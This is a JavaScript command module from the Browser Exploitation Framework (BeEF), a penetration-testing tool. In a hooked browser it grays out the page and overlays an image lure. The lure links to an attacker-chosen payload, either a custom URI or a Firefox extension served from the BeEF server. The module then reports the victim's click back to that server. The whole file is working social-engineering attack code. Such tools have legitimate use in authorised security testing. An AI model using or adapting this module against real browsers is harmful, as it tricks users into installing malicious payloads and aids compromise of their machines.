//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
  // Module Configurations
  var image = "<%== @image %>";
  var payload_type = "<%== @payload %>";
  var payload_uri = "<%== @payload_uri %>";

  var beef_root = beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port;
  var payload = "";

  // Function to gray out the screen
  var grayOut = function(vis, options) {
    var options = options || {};
    var zindex = options.zindex || 50;
    var opacity = options.opacity || 70;
    var opaque = (opacity / 100);
    var bgcolor = options.bgcolor || '#000000';
    var dark=document.getElementById('darkenScreenObject');
    if (!dark) {
      var tbody = document.getElementsByTagName("body")[0];
      var tnode = document.createElement('div');
      tnode.style.position='absolute';
      tnode.style.top='0px';
      tnode.style.left='0px';
      tnode.style.overflow='hidden';
      tnode.style.display='none';
      tnode.id='darkenScreenObject';
      tbody.appendChild(tnode);
      dark=document.getElementById('darkenScreenObject');
    }
    if (vis) {
      var pageWidth='100%';
      var pageHeight='100%';
      dark.style.opacity=opaque;
      dark.style.MozOpacity=opaque;
      dark.style.filter='alpha(opacity='+opacity+')';
      dark.style.zIndex=zindex;
      dark.style.backgroundColor=bgcolor;
      dark.style.width= pageWidth;
      dark.style.height= pageHeight;
      dark.style.display='block';
    } else {
      dark.style.display='none';
    }
  };


  // Payload Configuration
  switch (payload_type) {
    case "Custom_Payload":
      payload = payload_uri;
    break;
    case "Firefox_Extension":
      payload = beef_root + "/api/ipec/ff_extension";
      break;
    default:
      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'error=payload not selected');
      break;
  }

  // Create DIV
  var flashdiv = document.createElement('div');
  flashdiv.setAttribute('id', 'flashDiv');
  flashdiv.setAttribute('style', 'position:absolute; top:20%; left:30%; z-index:51;');
  flashdiv.setAttribute('align', 'center');
  document.body.appendChild(flashdiv);

  // window.open is very useful when using data URI vectors and the IFrame/Object tag
  // also, as the user is clicking on the link, the new tab opener is not blocked by the browser.
  flashdiv.innerHTML = "<a href=\"" + payload + "\" target=\"_blank\" ><img src=\"" + image + "\" /></a>";

  // gray out the background
  grayOut(true,{'opacity':'30'});

  // clean up on click
  $j("#flashDiv").click(function () {
    $j(this).hide();
    document.body.removeChild(flashdiv);
    grayOut(false,{'opacity':'0'});
    document.body.removeChild(document.getElementById('darkenScreenObject'));
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=user has clicked');
  });

});
